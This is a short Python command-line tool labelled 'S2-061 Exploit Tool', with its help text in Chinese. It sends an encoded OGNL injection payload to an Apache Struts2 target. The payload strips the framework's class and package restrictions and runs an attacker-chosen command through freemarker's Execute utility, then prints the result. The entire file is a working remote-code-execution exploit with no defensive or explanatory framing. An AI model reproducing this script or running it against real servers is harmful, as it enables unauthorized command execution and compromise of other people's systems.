import requests
import argparse

def send_data(payload_url):
    response = requests.get(payload_url)
    if response.status_code == 200:
        return response.text
    else:
        return f"Request failed with status code: {response.status_code}"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='S2-061 Exploit Tool')

    parser.add_argument('-u', '--url', help='目标URL')
    parser.add_argument('-c', '--command', help='要执行的命令')
    parser.add_argument('-p', '--param', help='payload参数')

    args = parser.parse_args()
    url = args.url
    command = args.command
    param = args.param

    payload = '?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27pwd%27}).(%23res%3d%23exec.exec(%23cmd))}'.replace('id', param).replace('pwd', command)

    payload_url = url + payload

    response_data = send_data(payload_url)
    print(response_data)
